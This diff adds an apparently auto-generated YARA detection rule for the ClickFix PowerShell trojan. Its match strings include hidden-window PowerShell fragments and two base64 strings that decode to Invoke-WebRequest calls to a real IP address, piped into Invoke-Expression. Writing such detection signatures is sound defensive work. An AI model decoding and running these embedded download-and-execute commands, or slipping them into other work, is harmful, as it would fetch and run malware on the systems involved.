@@ -73,3 +73,31 @@ rule Trojan_PowerShell_ClickFix_SVJ_2147977854_0
         (all of ($x*))
 }
 
+rule Trojan_PowerShell_ClickFix_SVL_2147978583_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:PowerShell/ClickFix.SVL"
+        threat_id = "2147978583"
+        type = "Trojan"
+        platform = "PowerShell: "
+        family = "ClickFix"
+        severity = "Critical"
+        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
+        threshold = "3"
+        strings_accuracy = "Low"
+    strings:
+        $x_1_1 = {70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 [0-16] 20 00 2d 00 77 00 20 00 68 00 [0-16] 69 00 72 00 6d 00}  //weight: 1, accuracy: Low
+        $x_1_2 = "|powershell -w h" wide //weight: 1
+        $x_1_3 = "gg.ps1" wide //weight: 1
+        $x_3_4 = "SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS96YXAvJyAtVXNlQmFzaWNQYXJzaW5nIHwgSW52b2tlLUV4cHJlc3Npb24=" wide //weight: 3
+        $x_3_5 = "SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS9fLycgLVVzZUJhc2ljUGFyc2luZyB8IEludm9rZS1FeHByZXNzaW9u" wide //weight: 3
+    condition:
+        (filesize < 20MB) and
+        (
+            ((3 of ($x_1_*))) or
+            ((1 of ($x_3_*))) or
+            (all of ($x*))
+        )
+}
+
